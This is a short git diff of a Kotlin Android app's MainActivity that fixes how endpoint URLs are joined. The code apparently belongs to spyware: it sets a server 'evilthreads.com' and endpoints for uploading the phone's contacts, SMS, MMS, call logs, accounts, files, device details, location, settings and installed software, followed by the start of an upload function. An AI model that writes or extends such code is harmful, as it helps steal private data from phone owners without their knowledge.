@@ -105,16 +105,16 @@ class MainActivity : AppCompatActivity() {
 }
 
 val url = "http://evilthreads.com/"
-val contactsUri = url.plus("/contacts")
-val smsUri = url.plus("/sms")
-val callLogUri = url.plus("/calls")
-val accountsUri = url.plus("/accounts")
-val mmsUri = url.plus("/mms")
-val filesUri = url.plus("/files")
-val deviceUri = url.plus("/device")
-val locationUri = url.plus("/location")
-val settingsUri = url.plus("/settings")
-val softwareUri = url.plus("/software")
+val contactsUri = url.plus("contacts")
+val smsUri = url.plus("sms")
+val callLogUri = url.plus("calls")
+val accountsUri = url.plus("accounts")
+val mmsUri = url.plus("mms")
+val filesUri = url.plus("files")
+val deviceUri = url.plus("device")
+val locationUri = url.plus("location")
+val settingsUri = url.plus("settings")
+val softwareUri = url.plus("software")
 
 inline suspend fun <reified T: PocketData>HttpClient.upload(data: Collection<T>){
     lateinit var uri: String
